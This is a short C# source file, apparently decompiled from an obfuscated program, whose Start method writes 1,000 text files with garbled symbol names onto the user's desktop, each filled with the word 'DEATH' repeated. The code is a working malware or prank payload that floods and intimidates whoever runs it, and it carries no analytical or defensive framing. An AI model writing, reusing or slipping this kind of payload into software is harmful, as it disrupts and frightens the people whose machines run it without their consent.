using System;
using System.IO;

namespace ṧ
{
	// Token: 0x02000008 RID: 8
	internal class FILE
	{
		// Token: 0x06000051 RID: 81 RVA: 0x00002548 File Offset: 0x00000748
		internal static void Start()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			for (int i = 0; i < 1000; i++)
			{
				string path = Path.Combine(folderPath, "☼◙♂♀♪█×™ñ²♦¥▄☼◙♂♀♪█×™ñ²♦¥▄☼◙♂♀♪█×™ñ²♦¥▄☼◙♂♀♪█×™ñ²♦¥▄" + i.ToString() + ".txt");
				File.WriteAllText(path, "DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH DEATH ");
			}
		}
	}
}
